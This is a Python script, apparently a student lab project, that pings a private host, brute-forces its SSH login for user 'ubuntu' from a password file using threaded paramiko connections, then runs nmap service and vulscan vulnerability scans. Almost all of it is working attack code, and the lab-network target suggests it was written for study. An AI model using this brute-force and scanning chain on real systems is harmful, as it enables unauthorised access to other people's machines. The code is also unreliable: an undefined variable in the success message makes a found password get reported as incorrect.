# MSA implementation script - Dragan Butkovic -P2408503

# Pip Installs Packages (PIP) is a tool with the capability that allows user
# to install software packages written in Python. This package managing
# system is used to download and set up packages from Python Package Index 
# PyPI. Installing PIP on Ubuntu 18.04 simple process.  

# INSTALLING PIP and PIP PACKAGES 
# sudo apt install python3-pip
# sudo pip3 install termcolor
# sudo pip3 install paramiko

#1. fping
#2. SSH-Brute-Force
#3. NSE ports scan
#4. NSE ports vulnerability

import os
import paramiko
import sys
import socket
import threading, time
from termcolor import colored

#-------------------------------------------------FPing---------------------------------------------------------------#

#Execution of the ping using the system ping the host (victims) (15 ping only) 
os.system('ping 192.168.253.136 -c 15')
print("pfing Done!")

#-------------------------------------------------SSH-Brute-Force-----------------------------------------------------#

exit_tag = 0
#setting the initial value to 0

print("\n\nstarting...")
os.system("notify-send Successfully initiated'")
time.sleep(2)

target_ip = "192.168.253.136"
username = "ubuntu"
password_file = "passwords.txt"
#Grasping the required variables....

#Setting A SSH join Function to start SSH period Against Target...
def ssh_connect(password, code=0):
  global exit_tag
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#read-through for each accurate password in List 
  try:
    ssh.connect(target_ip, port=22, username=username, password=password)
    exit_tag = 1
    print(colored(f"\n[+]SSH Password For {username} found :> {password}    {hammer}\n", "red", attrs=['bold']))
    os.system(f"notify-send 'Password Found::{password}'")
  except:
    print(colored(f"[!]Incorrect SSH password:> {password}", 'red'))
  ssh.close()

  ssh.close()
  return code

#Experimenting if the identified password File exists
if os.path.exists(password_file) == False:
  print(colored("[!] File Not Found", 'red'))
  sys.exit(1)

#Reading Passwords From the Indicated password File..!
with open(password_file, 'r') as file:
  for line in file.readlines():
    if exit_tag == 1:
      t.join()
      #Joining the Threads in-case a correct password is found
      exit()
    password = line.strip()
    t = threading.Thread(target=ssh_connect, args=(password,))
    t.start()
    #beginning to make way on ssh_connect function which takes only one argument of password...
    time.sleep(0.3)
   #time in seconds between each sequential thread//It should not be changed except if it became compulsory 
    #Lowering this time value might cause some faults......!

print("Brute-Force-SHH_Completed")
#-------------------------------------------------NSE-port-scan----------------------------------------------------#

#Executing Nmap script to scan for Open ports from the host
os.system('nmap -sV 192.168.253.136')
print("NSE Done!")

#-------------------------------------------------NSE-vulnerability-scan-------------------------------------------#

#Installing the vulscan script from git clone https://github.com/mrxdragan95/CTEC3451_2021_520_Development-Project.git
def vulscan():
    os.system('ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan')
    print("Moving_to_Script-Vulscan.nse")

    
vulscan()
#Executing Nmap vulnerability scan using NSE scripts from the host  
os.system('nmap -sV --script=vulscan/vulscan.nse 192.168.253.136')

print("NSE vulnerability Done!")

print("Completed")

